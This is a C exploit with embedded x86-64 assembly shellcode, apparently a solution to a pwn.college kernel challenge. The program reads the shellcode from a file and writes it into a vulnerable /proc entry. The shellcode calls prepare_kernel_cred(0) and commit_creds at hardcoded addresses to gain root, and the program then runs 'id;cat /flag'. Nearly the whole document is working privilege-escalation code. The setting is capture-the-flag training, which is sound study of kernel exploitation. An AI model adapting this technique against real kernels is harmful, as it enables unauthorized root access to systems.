
/*
[BITS 64]
section .text
global _start
_start:
    xor rdi, rdi                ; prepare_kernel_creds(0)
    mov rax, 0xffffffff81089660 ; prepare_kernel_creds address
    call rax                    ; RAX = new creds struct
    mov rdi, rax                ; commit_creds(creds)
    mov rax, 0xffffffff81089310 ; commit_creds address
    call rax
    ret                         ; Return to userland



nasm -f elf64 kaslr.asm -o shellcode.o
ld shellcode.o -o shellcode
objcopy --dump-section .text=shellcode.bin shellcode

*/
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>

#define SHELLCODE_FILE "shellcode.bin"
#define PROC_ENTRY "/proc/pwncollege"

int main() {
    int fd_proc, fd_shellcode;
    struct stat st;
    char *shellcode;
    ssize_t written;

    // 1. Open the proc entry
    fd_proc = open(PROC_ENTRY, O_WRONLY);
    if (fd_proc < 0) {
        perror("[-] Failed to open proc entry");
        exit(EXIT_FAILURE);
    }
    printf("[+] Opened %s\n", PROC_ENTRY);

    // 2. Open and read shellcode file
    fd_shellcode = open(SHELLCODE_FILE, O_RDONLY);
    if (fd_shellcode < 0) {
        perror("[-] Failed to open shellcode file");
        close(fd_proc);
        exit(EXIT_FAILURE);
    }

    // Get file size
    if (fstat(fd_shellcode, &st) < 0) {
        perror("[-] Failed to get shellcode size");
        close(fd_proc);
        close(fd_shellcode);
        exit(EXIT_FAILURE);
    }

    // Allocate buffer and read shellcode
    shellcode = malloc(st.st_size);
    if (!shellcode) {
        perror("[-] Failed to allocate memory");
        close(fd_proc);
        close(fd_shellcode);
        exit(EXIT_FAILURE);
    }

    if (read(fd_shellcode, shellcode, st.st_size) != st.st_size) {
        perror("[-] Failed to read shellcode");
        free(shellcode);
        close(fd_proc);
        close(fd_shellcode);
        exit(EXIT_FAILURE);
    }
    printf("[+] Read %ld bytes of shellcode\n", st.st_size);
    close(fd_shellcode);

    // 3. Write shellcode to proc entry
    written = write(fd_proc, shellcode, st.st_size);
    if (written < 0) {
        perror("[-] Failed to write shellcode");
    } else {
        printf("[+] Wrote %zd bytes to proc entry\n", written);
    }

    // Cleanup
    free(shellcode);
    close(fd_proc);

    // Verify if we got root
    printf("[*] Checking privileges...\n");
    system("id;cat /flag");

    return 0;
}
